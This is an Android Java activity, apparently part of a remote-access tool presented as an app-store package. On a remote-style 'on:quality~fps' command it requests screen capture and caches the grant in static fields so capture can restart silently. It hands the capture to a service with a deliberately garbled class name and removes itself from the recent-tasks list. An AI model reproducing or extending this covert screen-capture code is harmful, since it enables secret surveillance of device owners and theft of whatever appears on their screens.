package store.apps;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;


public class SecoundActivity extends Activity {
    private static final int REQUEST_SCREENSHOT=8525;
    private MediaProjectionManager mgr;
    private static Intent staticIntentData;
    private static int staticResultCode;
    private int _the_qq_ = 10;
    private int _the_fps_ = 10;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        try
        {
            requestWindowFeature(Window.FEATURE_NO_TITLE);
            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN);


            String value = null ;
            try {
                Intent intent = getIntent();
                value = intent.getStringExtra("key");
            }catch (Exception e){}

            if (value == null)
            {
                value = "off";
            }


            if (value.startsWith("on:"))
            {

                if(staticIntentData == null) {
                    value = value.replace("on:", "");
                    String[] inf = value.split("~");
                    _the_qq_ = Integer.parseInt(inf[0]);
                    _the_fps_ = Integer.parseInt(inf[1]);
                    mgr = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

                    startActivityForResult(mgr.createScreenCaptureIntent(),
                            REQUEST_SCREENSHOT);
                } else {
                    value = value.replace("on:", "");
                    String[] inf = value.split("~");
                    _the_qq_ = Integer.parseInt(inf[0]);
                    _the_fps_ = Integer.parseInt(inf[1]);
                    Intent i=
                            new Intent(this, AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg.class)
                                    .putExtra(AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg.EXTRA_RESULT_CODE, staticResultCode)
                                    .putExtra(AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg.EXTRA_RESULT_INTENT, staticIntentData)
                                    .putExtra("Q", _the_qq_)
                                    .putExtra("F", _the_fps_);

                    startService(i);
                    finish();
                }
            }
            else
            {
                Intent i=
                        new Intent(this, AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg.class)
                                .setAction(AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg.ACTION_SHUTDOWN);
                finish();

                startService(i);
            }

        }catch (Exception e){}

     //  finish();
    }



    private boolean Skip = false;
    @Override
    public void finish() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            super.finishAndRemoveTask();
        }
        else {
            super.finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode==REQUEST_SCREENSHOT) {
            if (resultCode==RESULT_OK) {
                staticIntentData =data;
                staticResultCode =resultCode;
                Intent i=
                        new Intent(this, AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg.class)
                                .putExtra(AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg.EXTRA_RESULT_CODE, resultCode)
                                .putExtra(AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg.EXTRA_RESULT_INTENT, data)
                                .putExtra("Q", _the_qq_)
                                .putExtra("F", _the_fps_);

                startService(i);
            }
        }

        finish();
    }
}
